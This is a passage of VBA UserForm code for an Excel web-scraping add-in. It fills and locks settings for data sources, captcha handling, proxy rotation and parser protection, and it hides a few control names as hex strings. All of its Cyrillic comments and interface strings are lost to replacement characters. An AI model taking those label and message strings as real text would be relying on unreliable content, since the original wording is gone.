            Me.ComboBox_CaptchaHandler = .CaptchaHandler
            Me.ComboBox_CaptchaAttempts = .CaptchaAttempts
            If (.CaptchaAttempts <= 0) Or (.CaptchaAttempts > 10) Then Me.ComboBox_CaptchaAttempts = 5
            Me.CheckBox_CaptchaShowPopup = .CaptchaShowPopup
            Me.CheckBox_CaptchaReloadPage = .CaptchaReloadPage
            
            Me.CheckBox_MainWorkbook_Open = .Workbook_Open
            Me.CheckBox_MainWorkbook_CreateFile = .Workbook_Create
            Me.CheckBox_MainWorkbook_Save = .Workbook_Save
            Me.CheckBox_MainWorkbook_ActivateSheet = .Workbook_Sheet
            Me.TextBox_MainWorkbook_Filename = .Workbook_Filename
            Me.TextBox_MainWorkbook_SheetName = .Workbook_Sheetname
            
            ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            Me.StopEvents = True
            RF_arr = All_RF.ArrayForListbox(.ResourceFileList)
            Me.ListBox_Resources.list = RF_arr
            For i = 1 To UBound(RF_arr)
                Me.ListBox_Resources.Selected(i - 1) = RF_arr(i, 3)
            Next i
            Me.StopEvents = False
        End With
        
        With .SourceData
            Me.ComboBox_SourceData_Mode.ListIndex = .Mode - 1
            
            Me.ComboBox_SourceData_ColumnNumber = ColumnNameByColumnNumber(.ColumnMode_Column)
            Me.ComboBox_SourceData_FirstRow = .ColumnMode_FirstRow
            Me.CheckBox_SourceData_SelectedRowsOnly = .ColumnMode_SelectedRowsOnly
            Me.CheckBox_SourceData_UseCellText = .ColumnMode_UseCellText
            
            Me.CheckBox_SourceData_CheckColumnEnabled = .ColumnMode_CheckColumnEnabled
            Me.ComboBox_SourceData_CheckColumnNumber = ColumnNameByColumnNumber(.ColumnMode_CheckColumnNumber)
            Me.TextBox_SourceData_CheckColumnMask = .ColumnMode_CheckColumnMask
            
            ' |fffd||fffd||fffd||fffd||fffd| 4 (Found_Column)
            Me.TextBox_SourceData_Find_Text = .FoundColumnMode_Find_Text
            Me.ComboBox_SourceData_Find_Row = .FoundColumnMode_Find_Row
            Me.ComboBox_SourceData_ColumnOffset = .FoundColumnMode_Find_ColumnOffset
            Me.ComboBox_SourceData_Found_FirstRow = .FoundColumnMode_FirstRow
            Me.CheckBox_SourceData_Found_SelectedRowsOnly = .FoundColumnMode_SelectedRowsOnly
            Me.CheckBox_SourceData_Found_UseCellText = .FoundColumnMode_UseCellText
            
            Me.CheckBox_SourceData_Found_CheckColumnEnabled = .FoundColumnMode_CheckColumnEnabled
            Me.ComboBox_SourceData_Found_CheckColumnOffset = .FoundColumnMode_CheckColumnOffset
            Me.TextBox_SourceData_Found_CheckColumnMask = .FoundColumnMode_CheckColumnMask
            
            ' |fffd||fffd||fffd||fffd||fffd| 5
            Me.ComboBox_SheetRangeMode_Find_Type.ListIndex = .SheetRangeMode_Find_Type
            Me.TextBox_SheetRangeMode_Find_Text = .SheetRangeMode_Find_Text
            Me.ComboBox_SheetRangeMode_SearchRange = .SheetRangeMode_SearchRange
            
            ' |fffd||fffd||fffd||fffd||fffd| 2
            Me.TextBox_SourceData_MinValue = .NumRangeMode_MinValue
            Me.TextBox_SourceData_MaxValue = .NumRangeMode_MaxValue
            Me.TextBox_SourceData_Step = .NumRangeMode_Step
            Me.ComboBox_SourceData_ExcludeValuesColumn = ColumnNameByColumnNumber(.NumRangeMode_ExcludeValuesColumn)
            Me.CheckBox_SourceData_ExcludeValues = .NumRangeMode_ExcludeValues
            
            Me.TextBox_SourceData_FixedValue = .FixedValueMode_Value
            Me.CheckBox_SourceData_SomeFixedValues = .FixedValueMode_SomeValues
        End With
        
        Me.Fill_OutputColumns_Values
        If Me.ListBox_OutputColumns.ListIndex = -1 Then Me.ListBox_OutputColumns.ListIndex = 0
        Me.MultiPage_OutputColumnsCommands.Pages("Page_AutoOrder").Visible = .Columns.AutoOrder Or SETT.GetBoolean("DeveloperMode")
        
        Me.Fill_Downloads_Values
        If Me.ListBox_Downloads.ListIndex = -1 Then Me.ListBox_Downloads.ListIndex = 0
        
        Me.Fill_ActionSets_Values
        If Me.ListBox_ActionSets.ListIndex = -1 Then Me.ListBox_ActionSets.ListIndex = 0
        
        Me.Fill_Macros_Values
        If Me.ListBox_Macros.ListIndex = -1 Then Me.ListBox_Macros.ListIndex = 0
        
        Me.Fill_Proxy_Values
        Me.Fill_Protection_Values
        
        Me.RefreshVariablesList
        
        If Me.ActiveParser.BuildIn And Not Developer Then
            ' Me.Frame_ParserActions.Visible = False
            ' Me.CommandButton_SaveAndCloseParser.Enabled = Me.ActiveParser.Hidden = False
            ' Me.CommandButton_SaveParser.Enabled = Me.ActiveParser.Hidden = False
            Me.ComboBox_AdditionalCommands.Enabled = False
        End If
        
        If .BuildIn And Not Developer Then
            ' Me.CheckBox_WP_TestMode.Enabled = Not .TestMode
        End If
        
        With .SourceData.Actions
            Me.StopEvents = True
            Me.ComboBox_MainActions_Level.Clear
            For i = 1 To .GetMaxLevel
                Me.ComboBox_MainActions_Level.AddItem i
            Next
            Me.ComboBox_MainActions_Level.value = .ActiveLevel
            Me.ListBox_Actions_Main.list = .GetActiveActions.ToArray(, True)
            Me.StopEvents = False
            Update_LevelButtons
        End With
        
        Me.CommandButton_OpenCacheFolder.ControlTipText = .GetCacheFolderPath
    End With
    Update_WP_Info
End Sub

Sub RefreshVariablesList()
    On Error Resume Next
    Dim cnt&
    With Me.ActiveParser.Variables
        cnt& = .Items.Count
        Me.Label_EditVariables.Visible = cnt& > 0
        If cnt& Then
            Me.Frame_Variables.Controls.Clear
            .CreateControls Me.Frame_Variables
        End If
    End With
End Sub

Sub Update_WP_Info()
    On Error Resume Next: Dim txt$
    With Me.ActiveParser
        If (Len(.AuthorID) > 0) And (Not .AuthorID Like "*#*#") Then
            txt$ = txt$ & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:  " & .AuthorID & vbNewLine
            If (Len(.LastEditorID) > 0) And (.AuthorID <> .LastEditorID) Then
                txt$ = txt$ & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|  " & .LastEditorID & vbNewLine
            End If
        Else
            txt$ = txt$ & "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|:  " & FileDateTime(.FileName) & vbNewLine
        End If
        txt$ = txt$ & "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:  " & .LastUpdate & vbNewLine
        If Len(.DevComment) Then txt$ = txt$ & vbNewLine & .DevComment
    End With
    
    Me.TextBox_WP_Info = txt$
End Sub

Private Sub ToggleButton_UnlockColumnNumbers_Change()
    On Error Resume Next
    Set Me.ToggleButton_UnlockColumnNumbers.Picture = IIf(Me.ToggleButton_UnlockColumnNumbers, Me.ImageUnlock.Picture, Me.ImageLock.Picture)
    Me.ComboBox_OC_ColumnNumber.list = Me.ActiveColumn.GetFreeColumnsList(Me.ToggleButton_UnlockColumnNumbers.value)
End Sub

Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
    On Error Resume Next: Dim msg$
    If Me.ActiveParser Is Nothing Then Exit Sub
    If Me.ActiveParser.Name = "close form" Then Exit Sub
    If Not Me.ActiveParser.Saved Then
        msg$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|?"
        Select Case MsgBox(msg, vbQuestion + vbYesNoCancel + vbDefaultButton3, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
            Case vbYes
                Me.ActiveParser.Save
            Case vbNo
                
            Case vbCancel
                Cancel = True
                Exit Sub
        End Select
    End If
    Set Me.SpecialControlsCollection = Nothing
End Sub

Private Sub UserForm_Initialize()
    On Error Resume Next
    Dim i&, ctrl As MSForms.Control, SC As SpecialControl, vis As Boolean, s As Single, ii As Single
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    
    Me.ComboBox_SourceData_Mode.AddItem "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| Excel, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    Me.ComboBox_SourceData_Mode.AddItem "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    Me.ComboBox_SourceData_Mode.AddItem "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
    Me.ComboBox_SourceData_Mode.AddItem "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| Excel, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    Me.ComboBox_SourceData_Mode.AddItem "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|/|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    
    Me.ComboBox_SheetRangeMode_Find_Type.AddItem "|fffd||fffd||fffd||fffd||fffd||fffd|"
    Me.ComboBox_SheetRangeMode_Find_Type.AddItem "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    Me.ComboBox_SheetRangeMode_Find_Type.AddItem "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    
    Me.ComboBox_SheetRangeMode_SearchRange.AddItem "(|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|)"
    Me.ComboBox_SheetRangeMode_SearchRange.AddItem "selection (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
    Me.ComboBox_SheetRangeMode_SearchRange.AddItem "B2:F15 (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
    Me.ComboBox_SheetRangeMode_SearchRange.AddItem "%|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|% (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
    
    Me.MultiPage_SourceData_Mode.Style = fmTabStyleNone
    
    For i = 1 To Application.max(256, SETT.GetNumber("MAX_COLUMN", 256))
        Me.ComboBox_SourceData_ColumnNumber.AddItem ColumnNameByColumnNumber(i)
        Me.ComboBox_SourceData_CheckColumnNumber.AddItem ColumnNameByColumnNumber(i)
        Me.ComboBox_SourceData_FirstRow.AddItem i
        Me.ComboBox_SheetHeaderRow.AddItem i
        Me.ComboBox_SheetBaseColumn.AddItem ColumnNameByColumnNumber(i)
        If i <= 20 Then Me.ComboBox_OC_MulticolumnStep.AddItem i
        
        If i <= 50 Then Me.ComboBox_SourceData_Find_Row.AddItem i
        Me.ComboBox_SourceData_Found_FirstRow.AddItem i
        Me.ComboBox_SourceData_ExcludeValuesColumn.AddItem ColumnNameByColumnNumber(i)
        Me.ComboBox_OCs_SearchForRow_Column.AddItem ColumnNameByColumnNumber(i)
        Me.ComboBox_ColumnAutoOrder_FirstColumn.AddItem ColumnNameByColumnNumber(i)
        If i > 1 Then Me.ComboBox_OC_MulticolumnHeadersCount.AddItem i
    Next
    
    For i = -20 To 20
        Me.ComboBox_SourceData_ColumnOffset.AddItem i
        Me.ComboBox_SourceData_Found_CheckColumnOffset.AddItem i
    Next
    For i = 10 To 300
        Me.ComboBox_SheetZoom.AddItem i & " %"
    Next
    
    
    Me.ComboBox_OCF_HorizontalAlignment.AddItem "Auto"
    Me.ComboBox_OCF_HorizontalAlignment.AddItem "Left"
    Me.ComboBox_OCF_HorizontalAlignment.AddItem "Center"
    Me.ComboBox_OCF_HorizontalAlignment.AddItem "Right"
    
    Me.ComboBox_ScreenUpdatingInterval.AddItem 1
    Me.ComboBox_ScreenUpdatingInterval.AddItem 3
    
    For i = 5 To 200 Step 5: Me.ComboBox_ScreenUpdatingInterval.AddItem i
    Next
    
    Me.ComboBox_WP_Pause.AddItem 0
    For ii = 0.1 To 0.9 Step 0.1: Me.ComboBox_WP_Pause.AddItem CStr(Replace(Format(ii, "0.0"), ",", "."))
    Next
    Me.ComboBox_WP_Pause.AddItem "1"
    For ii = 1.2 To 1.9 Step 0.2: Me.ComboBox_WP_Pause.AddItem CStr(Replace(Format(ii, "0.0"), ",", "."))
    Next
    For ii = 2 To 19 Step 1: Me.ComboBox_WP_Pause.AddItem ii
    Next
    For i = 20 To 95 Step 5: Me.ComboBox_WP_Pause.AddItem i
    Next
    For i = 100 To 600 Step 20: Me.ComboBox_WP_Pause.AddItem i
    Next
    
    For i = 1 To 600: Me.ComboBox_WP_Timeout.AddItem i
    Next
    For i = 0 To 5: Me.ComboBox_WP_RetryCountOnError.AddItem i
    Next
    For s = 0 To 140 Step 0.5: Me.ComboBox_OCF_ColumnWidth.AddItem Format(s, "0.0")
    Next
    For i = 1 To 15: Me.ComboBox_CaptchaAttempts.AddItem i
    Next
    For i = 1 To 20: Me.ComboBox_ProxyAttempts.AddItem i
    Next
    
    For i = 1 To 10: Me.ComboBox_Protection_ArrayLimit_Count.AddItem i
    Next
    For i = 15 To 200 Step 5: Me.ComboBox_Protection_ArrayLimit_Count.AddItem i
    Next
    For i = 2 To 100: Me.ComboBox_Protection_ReplaceInterval.AddItem i
    Next
    
    For i = 1 To 9: Me.ComboBox_Proxy_SwitchInCount.AddItem i
    Next
    For i = 10 To 100 Step 5: Me.ComboBox_Proxy_SwitchInCount.AddItem i
    Next
    For i = 150 To 1000 Step 50: Me.ComboBox_Proxy_SwitchInCount.AddItem i
    Next
    For i = 1500 To 10000 Step 500: Me.ComboBox_Proxy_SwitchInCount.AddItem i
    Next
    
    ' special controls
    Set Me.SpecialControlsCollection = New Collection
    For Each ctrl In Me.Controls
        If TypeName(ctrl) = "ScrollBar" And ctrl.Tag = "ScrollCombo" Then
            Set SC = New SpecialControl: Set SC.Scroller = ctrl
            If SC.FieldFound Then Me.SpecialControlsCollection.Add SC
        End If
    Next
    
    Set SC = New SpecialControl: Set SC.ColorSelectCombo = Me.ComboBox_OCF_HeaderColor: Me.SpecialControlsCollection.Add SC
    
    Set SC = New SpecialControl: Set SC.NumericTexbox = Me.TextBox_SourceData_MinValue: Me.SpecialControlsCollection.Add SC
    Set SC = New SpecialControl: Set SC.NumericTexbox = Me.TextBox_SourceData_MaxValue: Me.SpecialControlsCollection.Add SC
    Set SC = New SpecialControl: Set SC.NumericTexbox = Me.TextBox_SourceData_Step: Me.SpecialControlsCollection.Add SC
    Set SC = New SpecialControl: Set SC.MainCheckboxInFrame = Me.CheckBox_OCF_HyperlinkEnable: Me.SpecialControlsCollection.Add SC
    Set SC = New SpecialControl: Set SC.MainCheckboxInFrame = Me.CheckBox_PD_BasicAuthEnabled: Me.SpecialControlsCollection.Add SC
    Set SC = New SpecialControl: Set SC.MainCheckboxInFrame = Me.CheckBox_PD_PostAuthEnabled: Me.SpecialControlsCollection.Add SC
    Set SC = New SpecialControl: Set SC.MainCheckboxInFrame = Me.CheckBox_CaptchaEnabled: Me.SpecialControlsCollection.Add SC
    Set SC = New SpecialControl: Set SC.MainCheckboxInFrame = Me.CheckBox_UseProxy: Me.SpecialControlsCollection.Add SC
    Set SC = New SpecialControl: Set SC.MainCheckboxInFrame = Me.CheckBox_Proxy_SwitchInCount_Enabled: Me.SpecialControlsCollection.Add SC
    Set SC = New SpecialControl: Set SC.MainCheckboxInFrame = Me.CheckBox_OCs_SearchForRow: Me.SpecialControlsCollection.Add SC
    Set SC = New SpecialControl: Set SC.MainCheckboxInFrame = Me.CheckBox_WP_Locked: Me.SpecialControlsCollection.Add SC
    Set SC = New SpecialControl: Set SC.MainCheckboxInFrame = Me.CheckBox_ColumnAutoOrder: Me.SpecialControlsCollection.Add SC
    
    Const AS_ListWidth& = 23
    Me.ComboBox_ActionSet_SelectSpecialName.AddItem ACTION_SET_NAME_BEFORESTART$ & String(AS_ListWidth& - Len(ACTION_SET_NAME_BEFORESTART$), " ") & _
        "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
    Me.ComboBox_ActionSet_SelectSpecialName.AddItem ACTION_SET_NAME_ONSTART$ & String(AS_ListWidth& - Len(ACTION_SET_NAME_ONSTART$), " ") & _
        "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
    Me.ComboBox_ActionSet_SelectSpecialName.AddItem ACTION_SET_NAME_ONFINISH$ & String(AS_ListWidth& - Len(ACTION_SET_NAME_ONFINISH$), " ") & _
        "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
    Me.ComboBox_ActionSet_SelectSpecialName.AddItem ACTION_SET_NAME_BEFORE_SI$ & String(AS_ListWidth& - Len(ACTION_SET_NAME_BEFORE_SI$), " ") & _
        "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
    Me.ComboBox_ActionSet_SelectSpecialName.AddItem ACTION_SET_NAME_AFTER_SI$ & String(AS_ListWidth& - Len(ACTION_SET_NAME_AFTER_SI$), " ") & _
        "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
    Me.ComboBox_ActionSet_SelectSpecialName.AddItem ACTION_SET_NAME_AFTER_LAST_LEVEL$ & String(AS_ListWidth& - Len(ACTION_SET_NAME_AFTER_LAST_LEVEL$), " ") & _
        "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd|)"
    Me.ComboBox_ActionSet_SelectSpecialName.AddItem ACTION_SET_NAME_ONCAPTCHA$ & String(AS_ListWidth& - Len(ACTION_SET_NAME_ONCAPTCHA$), " ") & _
        "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Captcha)"
    Me.ComboBox_ActionSet_SelectSpecialName.AddItem ACTION_SET_NAME_MORE_PROXY$ & String(AS_ListWidth& - Len(ACTION_SET_NAME_MORE_PROXY$), " ") & _
        "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
    Me.ComboBox_ActionSet_SelectSpecialName.AddItem ACTION_SET_NAME_ON_PROXY_CHANGED$ & String(AS_ListWidth& - Len(ACTION_SET_NAME_ON_PROXY_CHANGED$), " ") & _
        "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
    
    
    Me.ComboBox_Proxy_Check_Presets.list = Proxy_Check_Presets_Array
    Me.ComboBox_Proxy_StatsClearInterval.list = Proxy_StatsClearInterval_Array
    
    Dim DeveloperMode As Boolean: DeveloperMode = SETT.GetBoolean("DeveloperMode")
    Me.ToggleButton_UnlockColumnNumbers.Visible = DeveloperMode
    Me.Frame_Column_QuickSetup.Visible = DeveloperMode
    Me.CommandButton_RunParserStart.Visible = DeveloperMode
    ' Me.Label_AddLoginAndPassword.Visible = DeveloperMode
    
    With Me.Controls(SETT.U("4D756C7469506167655F5750")).Pages(SETT.U("506167655F50726F74656374696F6E"))
        .Visible = Developer
    End With
    
    If Me.ActiveParser Is Nothing Then Set Me.ActiveParser = New WebsiteParser
    With Me.ComboBox_AdditionalCommands
        .AddItem "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddItem "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddItem "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        If Developer Then .AddItem "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
        If DeveloperMode Then .AddItem "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| Excel"
    End With
    Me.CommandButton_SelectAutoColumn.Enabled = Developer
    
    Me.MultiPage_WP.value = 0
    Me.MultiPage_SelectedColumn.value = 0
    Me.MultiPage_Columns.value = 0
    Me.MultiPage_AdditionalOptions.value = 0
    Me.MultiPage_OCF_CellFormat.value = 0
    Me.MultiPage_Proxy.value = 0
    STick& = 0
    
    ApplyZoomTo Me
    UserForm_AddCollapseButton Me.Caption
End Sub

Private Sub UserForm_Terminate()
    On Error Resume Next: Set Me.SpecialControlsCollection = Nothing
    Set Me.ActiveActionSet = Nothing
    Set Me.ActiveColumn = Nothing
    Set Me.ActiveControl = Nothing
    Set Me.ActiveDownload = Nothing
    Set Me.ActiveMacro = Nothing
    Set Me.ActiveParser = Nothing
End Sub

Sub RefreshVariablesListDropdowns()
    On Error Resume Next
    Dim arr: arr = Me.ActiveParser.GetVariablesNamesList(True)
    Me.ComboBox_HL_AddFromVariable_URL.list = arr
    Me.ComboBox_HL_AddFromVariable_Text.list = arr
    Me.ComboBox_DownloadFilename_AddFromVariable.list = arr
    Me.ComboBox_DownloadURL_AddFromVariable.list = arr
End Sub

Sub LockParserEditForm()
    On Error Resume Next: If StopEvents Then Exit Sub
    Dim Locked As Boolean, msg$
    Locked = Me.ActiveParser.Locked
    
    Me.CommandButton_SaveAndCloseParser.BackColor = IIf(Locked, 16761024, 12648384)
    With Me.ActiveParser.Protection
        Me.MultiPage_WP.Pages(1).Enabled = .SD_Source Or .SD_Actions Or Not Locked
        Me.Frame_SD_Source.Visible = .SD_Source Or Not Locked
        Me.Frame_SD_Actions.Visible = .SD_Actions Or Not Locked
        
        Me.MultiPage_WP.Pages(2).Enabled = .Output_Common Or Not Locked
        Me.Frame_Column_Actions.Visible = .Output_Actions Or Not Locked
        
        Me.MultiPage_WP.Pages(3).Enabled = .Download_Common Or Not Locked
        Me.MultiPage_WP.Pages(4).Enabled = .Extra_Common Or Not Locked
        
        Me.MultiPage_AdditionalOptions.Pages("Page_ActionSets").Enabled = .Extra_Actions Or Not Locked
        Me.MultiPage_AdditionalOptions.Pages("Page_Macro").Enabled = .Extra_Actions Or Not Locked
        Me.MultiPage_AdditionalOptions.Pages("Page_Extra").Enabled = .Extra_Actions Or Not Locked
        Me.Frame_Resources.Visible = .Extra_Actions Or Not Locked
        
        If Locked Then msg$ = Me.Label_HiddenWP.Tag & IIf(.ArrayLimit, "  " & SETT.U("CFE0F0F1E5F020E2FBE2EEE4E8F220EBE8F8FC20F7E0F1F2FC20E4E0EDEDFBF5") & ".", "")
        Me.Label_HiddenWP.Caption = msg$
    End With
    Me.Frame_VariableControl.Visible = Not Locked
End Sub

Private Sub TextBox_MainWorkbook_Filename_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
    If Button = 2 Then ShowVariablesList Me.TextBox_MainWorkbook_Filename
End Sub
Private Sub TextBox_MainWorkbook_SheetName_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
    If Button = 2 Then ShowVariablesList Me.TextBox_MainWorkbook_SheetName
End Sub
Private Sub TextBox_OCs_SearchForRow_Text_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
    If Button = 2 Then ShowVariablesList Me.TextBox_OCs_SearchForRow_Text
End Sub
Private Sub TextBox_DownloadSaveOptions_FilenameMask_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
    If Button = 2 Then ShowVariablesList Me.TextBox_DownloadSaveOptions_FilenameMask
End Sub

Sub ShowVariablesList(ByRef ctrl As MSForms.Control)
    On Error Resume Next
    If RunningParser Is Nothing Then MsgBox "Parser Edit Form: RunningParser Is Nothing", vbCritical, "Sub ShowVariablesList": Exit Sub
    
    Dim arr, iTop&, iLeft&, pCtrl As Object, n&
    Set pCtrl = ctrl.Parent
    Do While (TypeName(pCtrl) <> Me.Name) And (n < 15)
        If pCtrl.Top Then iTop& = iTop& + pCtrl.Top + 1
        If pCtrl.Left Then iLeft& = iLeft& + pCtrl.Left + 1
        If pCtrl.TabFixedHeight Then iTop& = iTop& + pCtrl.TabFixedHeight + 1
        n& = n& + 1    ': Debug.Print "typename", n, TypeName(pCtrl), iTop&, iLeft&
        Set pCtrl = pCtrl.Parent
    Loop
    
    arr = RunningParser.GetVariablesNamesList(True, , "Parser Edit Form")
    With Me.ComboBox_VariableList
        .Tag = ""
        .list = arr
        .ListIndex = -1
        .SetFocus
        .Left = ctrl.Left + 1 + iLeft&
        .Top = ctrl.Top + ctrl.Height - .Height + iTop&
        .Tag = ctrl.Name
        .DropDown
    End With
End Sub

Private Sub ComboBox_VariableList_Change()
    On Error Resume Next
    If Me.ComboBox_VariableList.Tag = "" Then Exit Sub
    Dim ctrl As MSForms.Control, txt$
